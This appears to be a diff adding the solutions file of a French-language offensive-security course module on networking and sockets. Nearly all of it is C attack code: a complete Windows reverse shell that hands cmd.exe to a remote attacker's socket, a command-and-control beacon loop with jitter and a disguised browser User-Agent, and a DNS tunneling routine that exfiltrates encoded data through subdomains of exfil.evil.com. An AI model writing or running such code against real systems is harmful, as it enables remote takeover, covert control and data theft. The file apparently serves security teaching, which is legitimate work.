@@ -1,0 +1,91 @@
+═══════════════════════════════════════════════════════════════════════════
+        MODULE 27 : NETWORKING & SOCKETS - SOLUTIONS
+═══════════════════════════════════════════════════════════════════════════
+
+SOLUTION EXERCICE 4 : Reverse Shell TCP
+─────────────────────────────────────────────────────────────────────────────
+
+void reverse_shell(const char* attacker_ip, int port) {
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in server;
+
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+    server.sin_addr.s_addr = inet_addr(attacker_ip);
+
+    // Connexion au listener
+    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
+        return;
+    }
+
+    // Redirection stdin/stdout/stderr
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+
+    // Lancer cmd.exe
+    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    closesocket(sock);
+}
+
+═══════════════════════════════════════════════════════════════════════════
+
+SOLUTION EXERCICE 5 : HTTP C2 Beacon
+─────────────────────────────────────────────────────────────────────────────
+
+void http_beacon(const char* c2_url) {
+    while (1) {
+        // Jitter (5-15 secondes)
+        int jitter = 5 + (rand() % 10);
+
+        // HTTP GET avec User-Agent légitime
+        char request[2048];
+        snprintf(request, sizeof(request),
+                 "GET %s HTTP/1.1\r\n"
+                 "Host: %s\r\n"
+                 "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+                 "Accept: text/html\r\n"
+                 "Connection: close\r\n\r\n",
+                 "/check", c2_url);
+
+        // Envoyer beacon et recevoir commandes
+        // ... (code socket)
+
+        Sleep(jitter * 1000);
+    }
+}
+
+═══════════════════════════════════════════════════════════════════════════
+
+SOLUTION EXERCICE 6 : DNS Tunneling
+─────────────────────────────────────────────────────────────────────────────
+
+void dns_exfiltrate(const char* data) {
+    // Encoder en Base32 ou hex
+    char encoded[256];
+    base32_encode(data, encoded);
+
+    // Fragmenter en chunks de 63 chars (limite subdomain)
+    for (size_t i = 0; i < strlen(encoded); i += 60) {
+        char query[256];
+        snprintf(query, sizeof(query), "%.60s.exfil.evil.com", encoded + i);
+
+        // Requête DNS A
+        struct hostent* he = gethostbyname(query);
+        // Serveur DNS reçoit les données dans le subdomain
+    }
+}
+
+═══════════════════════════════════════════════════════════════════════════
+
+Pour solutions complètes : Consultez projets open source
+- Reverse shells: Metasploit, Netcat
+- C2 frameworks: Sliver, Mythic, Cobalt Strike (commercial)
+- DNS Tunneling: DNSCat2, Iodine
+
+RAPPEL : Usage éducatif uniquement - Réseaux autorisés
+═══════════════════════════════════════════════════════════════════════════
